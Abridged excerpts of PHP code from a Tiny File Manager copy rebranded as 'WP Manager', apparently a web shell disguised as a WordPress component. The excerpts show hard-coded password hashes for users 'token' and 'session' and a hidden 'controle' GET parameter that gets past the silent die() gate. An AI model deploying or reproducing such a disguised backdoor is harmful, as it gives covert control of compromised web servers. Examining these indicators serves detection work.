...
//Application Title
define('APP_TITLE', 'WP Manager');

$use_auth = true;

$auth_users = array(
    'token' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO',
    'session' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO'
);
...
if (!isset($_SESSION[FM_SESSION_ID]['logged']) && !isset($_GET['controle'])){
    die();
}
            ...
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> WP Manager <?php echo VERSION; ?></a></h3></p>
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a href="" target="_blank" class="float-right text-muted">WP Manager <?php echo VERSION; ?></a></div>
        <?php else: ?>
            <div class="col-12"><a href="" target="_blank" class="float-right text-muted">WP Manager <?php echo VERSION; ?></a></div>
        <?php endif; ?>
    </div>
 ...
 class FM_Config
{
    ...
    function __construct()
    {
        ...
        if (strlen($CONFIG)) {
            ...
            $msg = 'WP Manager<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
...
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    ...
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with WP Manager">
...
function lng($txt) {
    ...
    // English Language
    $tr['en']['AppName']        = 'WP Manager';      $tr['en']['AppTitle']           = 'File Manager';
